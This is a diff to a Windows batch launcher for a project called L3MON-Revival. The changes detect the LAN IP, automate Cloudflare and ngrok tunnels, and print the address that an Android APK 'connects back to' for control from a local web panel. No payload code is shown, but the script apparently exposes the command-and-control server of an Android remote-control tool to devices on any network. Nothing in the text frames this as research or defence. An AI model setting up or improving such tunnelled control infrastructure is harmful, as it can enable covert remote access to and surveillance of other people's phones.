@@ -34,11 +34,19 @@ if !errorlevel! neq 0 (
 
 echo  [+] All dependencies are ready.
 echo.
+echo  ================================================
+echo   HOW IT WORKS:
+echo   - Panel URL  = You open this in your browser
+echo   - APK URL    = Phone connects to this address
+echo   - Local: both are same (your LAN IP)
+echo   - Tunnel: APK URL is the tunnel address
+echo  ================================================
+echo.
 echo  Select connection method:
 echo.
-echo   [1] Local Network
-echo   [2] Cloudflare Tunnel
-echo   [3] Ngrok
+echo   [1] Local Network  ^(LAN - panel + APK on same network^)
+echo   [2] Cloudflare Tunnel  ^(APK connects from anywhere - Recommended^)
+echo   [3] Ngrok  ^(APK connects from anywhere - Requires account^)
 echo   [4] Custom URL
 echo.
 set /p choice="  Your choice [1-4]: "
@@ -50,7 +58,14 @@ if "%choice%"=="4" goto :mode_custom
 goto :mode_local
 
 :mode_local
-set PUBLIC_URL=127.0.0.1
+for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4"') do (
+    set LAN_IP=%%a
+    set LAN_IP=!LAN_IP: =!
+    goto :got_lan_ip
+)
+:got_lan_ip
+if "!LAN_IP!"=="" set LAN_IP=127.0.0.1
+set PUBLIC_URL=!LAN_IP!
 set TUNNEL_TYPE=local
 set TUNNEL_PORT=22222
 goto :start_server
@@ -61,21 +76,22 @@ if !errorlevel! neq 0 (
     echo [*] Installing Cloudflare Tunnel...
     winget install Cloudflare.cloudflared -e --silent --accept-source-agreements --accept-package-agreements >nul 2>&1
 )
-echo [*] Starting Cloudflare Tunnel on port 22222...
 if exist .cf.log del .cf.log
+echo [*] Starting Cloudflare Tunnel on port 22222...
 start /b cloudflared tunnel --url http://127.0.0.1:22222 > .cf.log 2>&1
-echo [*] Waiting 15 seconds for Cloudflare URL...
-timeout /t 15 >nul
-set "PUBLIC_URL=TUNNEL_PENDING"
-for /f "tokens=*" %%a in ('findstr "trycloudflare.com" .cf.log 2^>nul') do (
-    set "CF_LINE=%%a"
-)
-for %%w in (!CF_LINE!) do (
-    echo %%w | findstr "trycloudflare.com" >nul 2>&1
-    if !errorlevel! equ 0 set "PUBLIC_URL=%%w"
-)
-set "PUBLIC_URL=!PUBLIC_URL:https://=!"
-set "PUBLIC_URL=!PUBLIC_URL:/=!"
+echo [*] Waiting for Cloudflare URL (up to 30 seconds)...
+set "PUBLIC_URL="
+set "ATTEMPTS=0"
+:cf_wait_loop
+timeout /t 3 >nul
+set /a ATTEMPTS=!ATTEMPTS!+1
+powershell -NoProfile -Command "try { $c = Get-Content '.cf.log' -Raw; if ($c -match '(https://[a-z0-9-]+\.trycloudflare\.com)') { Write-Host $matches[1] } } catch {}" > .cf_url.txt 2>nul
+set /p PUBLIC_URL=<.cf_url.txt
+if not "!PUBLIC_URL!"=="" goto :cf_got_url
+if !ATTEMPTS! lss 10 goto :cf_wait_loop
+set PUBLIC_URL=TIMEOUT_CHECK_CF_LOGS
+:cf_got_url
+del .cf_url.txt >nul 2>&1
 set TUNNEL_TYPE=cloudflare
 set TUNNEL_PORT=443
 goto :start_server
@@ -86,32 +102,33 @@ if !errorlevel! neq 0 (
     echo [*] Installing ngrok...
     winget install ngrok.ngrok -e --silent --accept-source-agreements --accept-package-agreements >nul 2>&1
 )
-set /p authtoken="  Enter Ngrok Authtoken: "
+set /p authtoken="  Enter Ngrok Authtoken (from https://dashboard.ngrok.com): "
 ngrok config add-authtoken !authtoken! >nul 2>&1
-echo [*] Starting Ngrok TCP on port 22222...
 if exist .ngrok.log del .ngrok.log
+echo [*] Starting Ngrok TCP on port 22222...
 start /b ngrok tcp 22222 --log=stdout > .ngrok.log 2>&1
-echo [*] Waiting 10 seconds for Ngrok URL...
-timeout /t 10 >nul
-set "PUBLIC_URL=TUNNEL_PENDING"
-set "TUNNEL_PORT=22222"
-for /f "tokens=*" %%a in ('findstr "tcp://" .ngrok.log 2^>nul') do (
-    set "NK_LINE=%%a"
-)
-for %%w in (!NK_LINE!) do (
-    echo %%w | findstr "tcp://" >nul 2>&1
-    if !errorlevel! equ 0 set "NK_URL=%%w"
-)
-set "NK_URL=!NK_URL:tcp://=!"
-for /f "tokens=1,2 delims=:" %%a in ("!NK_URL!") do (
-    set "PUBLIC_URL=%%a"
-    set "TUNNEL_PORT=%%b"
+echo [*] Waiting for Ngrok URL (up to 20 seconds)...
+set "PUBLIC_URL="
+set "ATTEMPTS=0"
+:ngrok_wait_loop
+timeout /t 2 >nul
+set /a ATTEMPTS=!ATTEMPTS!+1
+powershell -NoProfile -Command "try { $c = Get-Content '.ngrok.log' -Raw; if ($c -match 'tcp://([a-z0-9.]+):(\d+)') { Write-Host ($matches[1] + ':' + $matches[2]) } } catch {}" > .ngrok_url.txt 2>nul
+set /p NG_FULL=<.ngrok_url.txt
+if not "!NG_FULL!"=="" goto :ngrok_got_url
+if !ATTEMPTS! lss 10 goto :ngrok_wait_loop
+set NG_FULL=TIMEOUT:22222
+:ngrok_got_url
+del .ngrok_url.txt >nul 2>&1
+for /f "tokens=1,2 delims=:" %%a in ("!NG_FULL!") do (
+    set PUBLIC_URL=%%a
+    set TUNNEL_PORT=%%b
 )
 set TUNNEL_TYPE=ngrok
 goto :start_server
 
 :mode_custom
-set /p PUBLIC_URL="  Enter custom domain/IP: "
+set /p PUBLIC_URL="  Enter custom domain/IP (without http://): "
 set /p TUNNEL_PORT="  Enter control port [22222]: "
 if "!TUNNEL_PORT!"=="" set TUNNEL_PORT=22222
 set TUNNEL_TYPE=custom
@@ -121,10 +138,13 @@ goto :start_server
 echo.
 echo  ============================================
 echo   Tunnel Type  : !TUNNEL_TYPE!
-echo   Public URL   : !PUBLIC_URL!
-echo   Control Port : !TUNNEL_PORT!
+echo   APK URL      : !PUBLIC_URL!
+echo   APK Port     : !TUNNEL_PORT!
 echo   Panel URL    : http://127.0.0.1:22533
 echo  ============================================
+echo.
+echo  IMPORTANT: Open your panel at http://127.0.0.1:22533
+echo  The APK will connect back to: !PUBLIC_URL!:!TUNNEL_PORT!
 echo.
 echo  [+] Starting L3MON-Revival...
 echo  [+] Press Ctrl+C to stop.
